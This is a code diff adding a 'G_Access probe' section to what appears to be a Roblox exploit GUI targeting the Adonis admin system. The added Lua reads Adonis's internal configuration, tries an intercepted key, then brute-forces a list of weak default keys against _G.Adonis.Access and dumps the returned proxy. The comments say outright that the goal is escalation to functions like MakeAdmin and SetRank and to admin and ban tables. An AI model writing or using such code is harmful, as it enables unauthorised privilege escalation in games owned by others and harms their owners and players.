@@ -1076,6 +1076,227 @@ plOffBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ─────────────────────────────────────────────────────────────
+--  SECTION 14 — G_ACCESS PROBE
+--
+--  How G_Access works (from the source):
+--    _G.Adonis.Access(inputKey, tableName)
+--    Server checks: SHA256(inputKey .. GameId) == Variables.G_Access_Key
+--    If match → returns a read/write proxy to the requested table
+--
+--  Steps:
+--    1. Check if G_Access is enabled at all (Variables.G_Access == true)
+--    2. Try calling _G.Adonis.Access with the captured key directly
+--       (works if the server uses the raw key as the input, which some do)
+--    3. If that fails, try with known weak inputs ("admin","adonis","1234")
+--    4. If any call returns a non-nil proxy → we have API access
+--       and can read protected tables like Functions, Variables, etc.
+--
+--  What API access gives you:
+--    - Read adonis.Functions (contains MakeAdmin, SetRank, etc.)
+--    - Read adonis.Variables (rank tables, settings, admin list)
+--    - If G_Access_Perms != "Read", write access too
+-- ─────────────────────────────────────────────────────────────
+local gaCard = Card("🔓  G_Access probe  (escalation)")
+Lbl(gaCard,"tests whether G_Access is enabled and tries to call _G.Adonis.Access",Color3.fromRGB(110,110,110),1)
+
+local gaAppend, gaClear = LogBox(gaCard, 130, 2)
+
+-- custom key input for manual attempts
+local gaKeyBox  = InputBox(gaCard,"custom key to try (leave blank to use captured key)",3)
+local gaTblBox  = InputBox(gaCard,"table to request:  Service  Functions  Variables ...",4)
+
+local gaProbeBtn  = Btn(gaCard,"🔎 probe G_Access",           Color3.fromRGB(55,38,12), 5)
+local gaAutoBtn   = Btn(gaCard,"⚡ auto-try weak keys",        Color3.fromRGB(45,28,55), 6)
+local gaDumpBtn   = Btn(gaCard,"📋 dump returned proxy",       Color3.fromRGB(28,38,55), 7)
+local gaClearBtn  = Btn(gaCard,"clear",                        Color3.fromRGB(30,30,30), 8)
+local gaLbl       = Lbl(gaCard,"",Color3.fromRGB(140,200,140), 9)
+gaClearBtn.MouseButton1Click:Connect(gaClear)
+
+-- store whatever proxy we get back
+local gaProxy = nil
+
+-- check if G_Access is even configured
+local function CheckGAccessEnabled()
+    if not adonis then return false, "not linked" end
+    local vars = rawget(adonis,"Variables")
+    if type(vars)~="table" then return false, "Variables not found in adonis" end
+    local enabled = rawget(vars,"G_Access")
+    local key     = rawget(vars,"G_Access_Key")
+    local perms   = rawget(vars,"G_Access_Perms") or "Read"
+    return enabled==true,
+        "G_Access="..tostring(enabled)
+        .."  G_Access_Key="..tostring(key~=nil and "[set]" or "nil")
+        .."  G_Access_Perms="..tostring(perms)
+end
+
+-- attempt _G.Adonis.Access(inputKey, tableName)
+local function TryAccess(inputKey, tableName)
+    local api = rawget(_G,"Adonis")
+    if not api then return nil, "_G.Adonis not set" end
+    local ok, result = pcall(function()
+        return api.Access(inputKey, tableName or "Service")
+    end)
+    if ok and result ~= nil then
+        return result, "success"
+    end
+    return nil, ok and "returned nil (key rejected)" or tostring(result)
+end
+
+gaProbeBtn.MouseButton1Click:Connect(function()
+    if not adonis then gaAppend("not linked",Color3.fromRGB(255,100,100)) return end
+
+    -- step 1: check config
+    local enabled, configStr = CheckGAccessEnabled()
+    gaAppend("config:  "..configStr,
+        enabled and Color3.fromRGB(255,215,80) or Color3.fromRGB(180,180,180))
+
+    if not enabled then
+        gaAppend("G_Access is disabled on this server — escalation not possible via this path",
+            Color3.fromRGB(200,120,80))
+        gaLbl.Text="G_Access disabled" gaLbl.TextColor3=Color3.fromRGB(200,120,80)
+        return
+    end
+
+    gaAppend("G_Access is ENABLED — attempting key...",Color3.fromRGB(90,235,130))
+
+    -- step 2: try captured key directly
+    local inputKey = gaKeyBox.Text~="" and gaKeyBox.Text
+        or State.key or rawget(adonis.Core,"Key")
+    local tblName  = gaTblBox.Text~="" and gaTblBox.Text or "Service"
+
+    if inputKey then
+        gaAppend("trying captured key: "..tostring(inputKey).."  table: "..tblName,
+            Color3.fromRGB(130,210,255))
+        local proxy, msg = TryAccess(tostring(inputKey), tblName)
+        if proxy then
+            gaProxy = proxy
+            gaAppend("✓ ACCESS GRANTED with key: "..tostring(inputKey),
+                Color3.fromRGB(90,235,130))
+            gaAppend("proxy type: "..typeof(proxy).."  mt: "..tostring(getmetatable(proxy)),
+                Color3.fromRGB(195,165,255))
+            gaLbl.Text="✓ access granted — use dump proxy to read"
+            gaLbl.TextColor3=Color3.fromRGB(90,235,130)
+            print("[AdonisTools] G_Access granted with key: "..tostring(inputKey))
+            return
+        else
+            gaAppend("✗ key rejected: "..msg,Color3.fromRGB(200,120,80))
+        end
+    else
+        gaAppend("no key captured yet — start key intercept first",Color3.fromRGB(255,175,80))
+    end
+
+    gaLbl.Text="access denied" gaLbl.TextColor3=Color3.fromRGB(200,120,80)
+end)
+
+-- auto-try a list of common weak/default keys
+gaAutoBtn.MouseButton1Click:Connect(function()
+    if not adonis then gaAppend("not linked",Color3.fromRGB(255,100,100)) return end
+
+    local enabled, configStr = CheckGAccessEnabled()
+    gaAppend("config:  "..configStr,
+        enabled and Color3.fromRGB(255,215,80) or Color3.fromRGB(180,180,180))
+
+    if not enabled then
+        gaAppend("G_Access disabled — auto-try skipped",Color3.fromRGB(200,120,80))
+        return
+    end
+
+    local tblName = gaTblBox.Text~="" and gaTblBox.Text or "Service"
+
+    -- common weak keys people use in Adonis configs
+    local weakKeys = {
+        "admin", "adonis", "1234", "password", "secret",
+        "key", "access", "1234567890", "admin123", "roblox",
+        "adonisadmin", "adonis_key", "g_access", "gaccess",
+        tostring(game.GameId),                  -- GameId alone
+        "adonis"..tostring(game.GameId),         -- adonis+GameId
+        tostring(game.PlaceId),                  -- PlaceId alone
+    }
+
+    -- also add the captured key if available
+    local capturedKey = State.key or rawget(adonis.Core,"Key")
+    if capturedKey then table.insert(weakKeys, 1, tostring(capturedKey)) end
+
+    gaAppend("trying "..#weakKeys.." keys against table '"..tblName.."'...",
+        Color3.fromRGB(195,165,255))
+
+    local found = false
+    for _, k in ipairs(weakKeys) do
+        local proxy, msg = TryAccess(k, tblName)
+        if proxy then
+            gaProxy = proxy
+            gaAppend("✓ ACCESS GRANTED — key: "..tostring(k),Color3.fromRGB(90,235,130))
+            gaAppend("proxy: "..typeof(proxy).."  mt: "..tostring(getmetatable(proxy)),
+                Color3.fromRGB(195,165,255))
+            gaLbl.Text="✓ access granted with: "..tostring(k)
+            gaLbl.TextColor3=Color3.fromRGB(90,235,130)
+            print("[AdonisTools] G_Access granted — key was: "..tostring(k))
+            found=true break
+        else
+            gaAppend("✗ "..tostring(k).."  → "..msg,Color3.fromRGB(130,130,130))
+        end
+        task.wait()  -- yield between attempts so we don't freeze
+    end
+
+    if not found then
+        gaAppend("all keys rejected — server key is not weak/default",Color3.fromRGB(200,120,80))
+        gaLbl.Text="all attempts failed" gaLbl.TextColor3=Color3.fromRGB(200,120,80)
+    end
+end)
+
+-- dump whatever proxy was returned
+gaDumpBtn.MouseButton1Click:Connect(function()
+    if not gaProxy then
+        gaAppend("no proxy — run probe or auto-try first",Color3.fromRGB(255,175,80))
+        return
+    end
+    gaAppend("── proxy dump ────────────────────────",Color3.fromRGB(160,130,220))
+    local n=0
+    -- try iterating — G_Access proxies expose __index but may block pairs
+    -- so we try known keys from the Adonis source first, then raw pairs
+    local knownKeys = {
+        -- Service keys
+        "TrackTask","EventTask","GetTasks","StartLoop","StopLoop",
+        "Wrap","UnWrap","ReadOnly","New","Delete","GetPlayers",
+        "Filter","LaxFilter","FormatPlayer","FormatTime","FormatNumber",
+        -- Functions keys
+        "MakeAdmin","RemoveAdmin","SetRank","GetRank","IsAdmin",
+        "CheckAdmin","GetGroupRank","GetGroupRole",
+        -- Variables keys
+        "Admins","Banned","Settings","AdminLevels","G_Access",
+        "G_Access_Key","G_Access_Perms","AdonisVersion",
+    }
+    for _,k in ipairs(knownKeys) do
+        local ok,v = pcall(function() return gaProxy[k] end)
+        if ok and v~=nil then
+            local vt=typeof(v)
+            gaAppend("["..vt.."]  "..k.." = "..tostring(v),
+                vt=="function" and Color3.fromRGB(145,210,145)
+                or vt=="table" and Color3.fromRGB(185,160,255)
+                or Color3.fromRGB(195,205,200))
+            n=n+1
+        end
+    end
+    -- also try raw pairs in case it's not locked
+    pcall(function()
+        for k,v in pairs(gaProxy) do
+            local vt=typeof(v)
+            gaAppend("["..vt.."]  "..tostring(k).." = "..tostring(v),
+                vt=="function" and Color3.fromRGB(145,210,145)
+                or vt=="table" and Color3.fromRGB(185,160,255)
+                or Color3.fromRGB(195,205,200))
+            n=n+1
+            if n>100 then gaAppend("...truncated") break end
+        end
+    end)
+    if n==0 then
+        gaAppend("proxy returned no readable keys",Color3.fromRGB(140,140,140))
+        gaAppend("(server may have G_Access_Perms = Read with locked proxy)",
+            Color3.fromRGB(120,120,120))
+    end
+end)
+
+-- ─────────────────────────────────────────────────────────────
 --  AUTO LINK ON LOAD
 -- ─────────────────────────────────────────────────────────────
 task.spawn(function()
